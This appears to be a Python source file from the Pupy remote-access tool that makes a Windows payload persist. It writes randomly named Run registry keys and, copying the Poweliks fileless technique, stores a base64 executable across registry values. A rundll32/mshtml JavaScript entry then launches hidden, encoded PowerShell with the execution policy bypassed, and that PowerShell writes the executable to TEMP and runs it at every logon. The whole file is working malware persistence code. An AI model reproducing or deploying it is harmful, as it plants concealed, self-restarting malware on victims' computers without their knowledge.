from _winreg import *
import random
import string
import base64
import os

#http://www.primalsecurity.net/0xc-python-tutorial-python-malware/
def registry_check(run,marker):
    runkey =[]
    try: # no clue why i can not merge all these
        key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
        HKEY = HKEY_LOCAL_MACHINE
        HK = 'HKLM'
    except WindowsError:
        pass
    try:
        key = OpenKey(HKEY_CURRENT_USER, run, 0, KEY_ALL_ACCESS)
        HKEY = HKEY_CURRENT_USER
        HK = 'HKCU'
    except WindowsError:
        pass
    i = 0
    try:
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[1][:len(marker)])
            i += 1
    except WindowsError:
        pass

    return HKEY, HK, runkey

def binary_startup(bin_path):
    run = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    marker = os.getenv('TEMP')
    HKEY, HK, runkey = registry_check(run,marker)

    # Set autorun key:
    if marker not in runkey:
        #create random names for each registry entry
        randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
        
        Key = OpenKey(HKEY, run, 0, KEY_WRITE)
        SetValueEx(Key, randname, 0, REG_SZ, bin_path)
        CloseKey(Key)

def javascript_startup(bin_data):
    run = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    pupy = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
    marker = 'C:\\WINDOWS\\system32\\rundll32.exe'
    HKEY, HK, runkey = registry_check(run,marker)

    # Set autorun key:
    if marker not in runkey:
        #https://msdn.microsoft.com/en-us/library/windows/desktop/ms724872%28v=vs.85%29.aspx
        n = 16383
        bin_b64_data = [bin_data[i:i+n] for i in range(0, len(bin_data), n)]

        js_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
        script_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])

        # original poweliks reg script
        js_main = """C:\\WINDOWS\\system32\\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\\74script language=jscript>"+((new%%20ActiveXObject("WScript.Shell")).RegRead("%s\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\%s")+"\\74/script>"))""" % (HK, script_name)

        # b64 decoder entry for encoded binary
        # originally used for powersploit shellcode injection, file is too large to inject directly, leaving it in part for future use
        # https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/
        ps_script = base64.b64encode(("""$shellcode_string='$key="HKCU:\Software\Microsoft\Windows\CurrentVersion";$key_val=(Get-Item -Path $key).Property;foreach($value in $key_val){[string]$b64+=(Get-Item -Path $key).GetValue($value)};$ByteArray=[System.Convert]::FromBase64String($b64);[string]$File=(Join-Path -Path $env:TEMP -ChildPath ([system.guid]::NewGuid().ToString()+".exe"));[System.IO.File]::WriteAllBytes($File, $ByteArray);Start-Process -FilePath $File;';$goat=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$powershellx86=$env:SystemRoot+"syswow64WindowsPowerShellv1.0powershell.exe";$cmd="-noprofile -windowstyle hidden -noninteractive -EncodedCommand";iex "& $powershellx86 $cmd $goat";}else{$cmd="-noprofile -windowstyle hidden -noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""").encode('utf_16_le'))
        
        js_script = """var shell=new ActiveXObject("WScript.Shell");shell.run("powershell -executionpolicy bypass -noexit -encodedCommand %s")""" % (ps_script)

        key = OpenKey(HKEY, run, 0, KEY_WRITE)
        SetValueEx(key, js_name, 0, REG_SZ, js_main)
        SetValueEx(key, script_name, 0, REG_SZ, js_script)
        CloseKey(key)

        randname = []
        for n in bin_b64_data:
            randname.append(''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))]))

        b64_key = OpenKey(HKEY, pupy, 0, KEY_WRITE)
        for d in range(len(randname)):
            SetValueEx(b64_key, sorted(randname)[d], 0, REG_SZ, bin_b64_data[d])
        CloseKey(b64_key)
